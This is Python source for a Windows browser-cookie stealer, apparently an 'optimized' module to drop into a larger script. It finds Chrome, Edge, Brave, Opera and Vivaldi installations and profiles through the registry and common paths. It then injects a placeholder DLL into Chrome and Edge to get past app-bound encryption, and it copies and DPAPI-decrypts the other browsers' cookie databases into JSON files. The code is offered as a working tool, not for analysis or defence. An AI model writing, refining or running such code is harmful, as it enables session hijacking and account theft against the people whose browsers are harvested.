# OPTIMIZED BROWSER PATH DISCOVERY - Fast targeted scanning
# Replace the hardcoded paths in the main script with this

import os
import winreg
from pathlib import Path

def get_browser_paths_optimized():
    """
    Returns dictionaries of installation paths for each browser
    Uses registry first (instant), then common paths (checks ~15 locations total)
    No recursive scanning - script completes in <2 seconds
    """
    
    # Common drive letters to check (prioritize most likely)
    drives = ['C:\\']
    # Add other drives only if they exist (quick check)
    for letter in 'DEFGH':
        potential = f"{letter}:\\"
        if os.path.exists(potential):
            drives.append(potential)
    
    # Browser executable names
    browsers = {
        'chrome': 'chrome.exe',
        'edge': 'msedge.exe', 
        'brave': 'brave.exe',
        'opera': 'opera.exe',
        'vivaldi': 'vivaldi.exe'
    }
    
    # Registry paths for definitive installation locations (fastest method)
    registry_paths = {
        'chrome': [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe",
            r"SOFTWARE\WOW6432Node\Google\Update\Clients\{8A69D345-D564-463C-AFF1-A69D9E530F96}",
            r"SOFTWARE\Google\Chrome"
        ],
        'edge': [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe",
            r"SOFTWARE\WOW6432Node\Microsoft\Edge"
        ],
        'brave': [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\brave.exe",
            r"SOFTWARE\BraveSoftware\Brave-Browser"
        ],
        'opera': [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\opera.exe",
            r"SOFTWARE\WOW6432Node\Opera Software"
        ],
        'vivaldi': [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\vivaldi.exe",
            r"SOFTWARE\Vivaldi"
        ]
    }
    
    # Common directory patterns (fast, non-recursive)
    common_dirs = [
        r"Program Files\{browser}\Application",
        r"Program Files (x86)\{browser}\Application",
        r"{drive}{browser}\Application",
        r"{drive}Program Files\{browser}\Application",
        r"{drive}Program Files (x86)\{browser}\Application",
        r"{drive}Applications\{browser}",
        r"{drive}PortableApps\{browser}",
        r"{drive}Software\{browser}",
        r"{drive}Tools\{browser}"
    ]
    
    # User-level installs (common on non-admin systems)
    user_level = [
        os.path.expandvars(r"%LOCALAPPDATA%\{browser}\Application"),
        os.path.expandvars(r"%APPDATA%\{browser}"),
        os.path.expandvars(r"%USERPROFILE%\AppData\Local\{browser}\Application"),
        os.path.expandvars(r"%USERPROFILE%\{browser}")
    ]
    
    found_paths = {browser: [] for browser in browsers}
    
    # STEP 1: Check registry (fastest - instant)
    for browser, reg_keys in registry_paths.items():
        for reg_key in reg_keys:
            try:
                # Try both HKLM and HKCU
                for hive in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
                    try:
                        key = winreg.OpenKey(hive, reg_key, 0, winreg.KEY_READ)
                        # Try to get install path
                        for value_name in ['', 'InstallPath', 'Program', 'Path', 'ApplicationPath']:
                            try:
                                path, _ = winreg.QueryValueEx(key, value_name)
                                if path and os.path.exists(path):
                                    exe_path = os.path.join(path, browsers[browser])
                                    if os.path.exists(exe_path):
                                        found_paths[browser].append(exe_path)
                                    # Also check if path already includes exe
                                    elif os.path.exists(path) and path.lower().endswith('.exe'):
                                        found_paths[browser].append(path)
                                break
                            except:
                                continue
                        winreg.CloseKey(key)
                    except:
                        continue
            except:
                pass
    
    # STEP 2: Check user-level installs (fast - ~5 paths per browser)
    for browser, exe_name in browsers.items():
        for user_path in user_level:
            path = user_path.format(browser=browser.capitalize())
            exe_path = os.path.join(path, exe_name)
            if os.path.exists(exe_path):
                found_paths[browser].append(exe_path)
            
            # Also check without 'Application' subfolder
            alt_path = user_path.replace(r"\Application", "")
            alt_exe = os.path.join(alt_path, exe_name)
            if os.path.exists(alt_exe):
                found_paths[browser].append(alt_exe)
    
    # STEP 3: Check common system-wide patterns (priority: Program Files first)
    # Only check if not already found (saves time)
    for browser, exe_name in browsers.items():
        if found_paths[browser]:
            continue  # Already found via registry, skip scanning
            
        # Check default Program Files first (most common)
        default_paths = [
            rf"C:\Program Files\{browser.capitalize()}\Application\{exe_name}",
            rf"C:\Program Files (x86)\{browser.capitalize()}\Application\{exe_name}",
            rf"C:\Program Files\Google\Chrome\Application\{exe_name}" if browser == 'chrome' else None,
            rf"C:\Program Files (x86)\Google\Chrome\Application\{exe_name}" if browser == 'chrome' else None,
            rf"C:\Program Files (x86)\Microsoft\Edge\Application\{exe_name}" if browser == 'edge' else None,
        ]
        
        for path in default_paths:
            if path and os.path.exists(path):
                found_paths[browser].append(path)
                break
        
        # If still not found, check other drives quickly
        if not found_paths[browser]:
            for drive in drives:
                # Only check the most common patterns per drive
                patterns = [
                    rf"{drive}Program Files\{browser.capitalize()}\Application\{exe_name}",
                    rf"{drive}Program Files (x86)\{browser.capitalize()}\Application\{exe_name}",
                    rf"{drive}{browser.capitalize()}\{exe_name}",
                    rf"{drive}PortableApps\{browser.capitalize()}\{exe_name}"
                ]
                for pattern in patterns:
                    if os.path.exists(pattern):
                        found_paths[browser].append(pattern)
                        break
                if found_paths[browser]:
                    break
    
    # Remove duplicates
    for browser in found_paths:
        found_paths[browser] = list(dict.fromkeys(found_paths[browser]))
    
    return found_paths

def find_browser_profiles_fast():
    """
    Fast profile path discovery for cookie databases
    Checks common profile locations without deep scanning
    """
    profile_paths = {
        'chrome': [],
        'edge': [],
        'brave': [],
        'opera': [],
        'vivaldi': []
    }
    
    # Common profile base directories
    profile_bases = [
        os.path.expandvars(r"%LOCALAPPDATA%"),
        os.path.expandvars(r"%APPDATA%"),
        os.path.expandvars(r"%USERPROFILE%\AppData\Local"),
        os.path.expandvars(r"%USERPROFILE%\AppData\Roaming")
    ]
    
    # Browser-specific profile folder names
    browser_folders = {
        'chrome': ['Google\\Chrome\\User Data', 'Chrome\\User Data'],
        'edge': ['Microsoft\\Edge\\User Data', 'Edge\\User Data'],
        'brave': ['BraveSoftware\\Brave-Browser\\User Data', 'Brave-Browser\\User Data'],
        'opera': ['Opera Software\\Opera Stable', 'Opera\\Opera Stable'],
        'vivaldi': ['Vivaldi\\User Data', 'Vivaldi\\Vivaldi']
    }
    
    # Check each base directory for browser profiles
    for base in profile_bases:
        if not os.path.exists(base):
            continue
            
        for browser, folders in browser_folders.items():
            for folder in folders:
                profile_dir = os.path.join(base, folder)
                if os.path.exists(profile_dir):
                    # Check for cookies database
                    cookie_db = os.path.join(profile_dir, 'Default', 'Network', 'Cookies')
                    if browser in ['opera']:
                        cookie_db = os.path.join(profile_dir, 'Network', 'Cookies')
                    
                    if os.path.exists(cookie_db):
                        profile_paths[browser].append(profile_dir)
                    else:
                        # Also check without Network subfolder
                        cookie_db_alt = os.path.join(profile_dir, 'Default', 'Cookies')
                        if os.path.exists(cookie_db_alt):
                            profile_paths[browser].append(profile_dir)
    
    # Also check registry for profile paths (some browsers store location in registry)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
        personal = winreg.QueryValueEx(key, "Personal")[0]
        winreg.CloseKey(key)
        
        # Check for portable browser profiles in Documents
        portable_paths = [
            os.path.join(personal, "PortableApps"),
            os.path.join(os.path.expandvars(r"%USERPROFILE%"), "Documents", "PortableApps")
        ]
        
        for portable_base in portable_paths:
            if os.path.exists(portable_base):
                for browser in browser_folders:
                    for folder in browser_folders[browser]:
                        potential_profile = os.path.join(portable_base, folder)
                        if os.path.exists(potential_profile):
                            profile_paths[browser].append(potential_profile)
    except:
        pass
    
    return profile_paths

# Update the main extraction function to use these optimized lookups
def extract_all_cookies_optimized():
    """Main extraction using fast path discovery"""
    
    # Get browser installations fast (<1 second typically)
    browser_exes = get_browser_paths_optimized()
    
    # Get profile paths fast (<0.5 seconds)
    profiles = find_browser_profiles_fast()
    
    # Extract Chrome cookies (app-bound encryption)
    for chrome_path in browser_exes.get('chrome', []):
        if os.path.exists(chrome_path):
            inject_dll_extract_cookies(chrome_path, DLL_BASE64_PLACEHOLDER)
    
    # Extract Edge cookies (app-bound encryption)
    for edge_path in browser_exes.get('edge', []):
        if os.path.exists(edge_path):
            inject_dll_extract_cookies(edge_path, DLL_BASE64_PLACEHOLDER)
    
    # Extract other browsers
    for browser in ['brave', 'opera', 'vivaldi']:
        # Use profile paths directly (no need for browser exe for extraction)
        for profile in profiles.get(browser, []):
            cookies = extract_native_cookies_from_profile(browser, profile)
            if cookies:
                with open(os.path.join(output_dir, f"{browser}.json"), "w") as f:
                    json.dump(cookies, f)

def extract_native_cookies_from_profile(browser_name, profile_path):
    """Extract cookies directly from profile path"""
    cookies = []
    
    # Determine cookie database path
    if browser_name == 'opera':
        cookie_db = os.path.join(profile_path, 'Network', 'Cookies')
        if not os.path.exists(cookie_db):
            cookie_db = os.path.join(profile_path, 'Cookies')
    else:
        cookie_db = os.path.join(profile_path, 'Default', 'Network', 'Cookies')
        if not os.path.exists(cookie_db):
            cookie_db = os.path.join(profile_path, 'Default', 'Cookies')
    
    if not os.path.exists(cookie_db):
        return cookies
    
    # Copy to temp to avoid lock
    temp_db = os.path.join(tempfile.gettempdir(), f"~{browser_name}_{os.getpid()}.db")
    try:
        shutil.copy2(cookie_db, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
        
        for row in cursor.fetchall():
            decrypted = decrypt_dpapi(row[3])
            if decrypted:
                cookies.append({
                    "host": row[0],
                    "name": row[1],
                    "path": row[2],
                    "value": decrypted,
                    "expires": row[4],
                    "browser": browser_name,
                    "profile": profile_path
                })
        
        conn.close()
    except:
        pass
    finally:
        if os.path.exists(temp_db):
            os.remove(temp_db)
    
    return cookies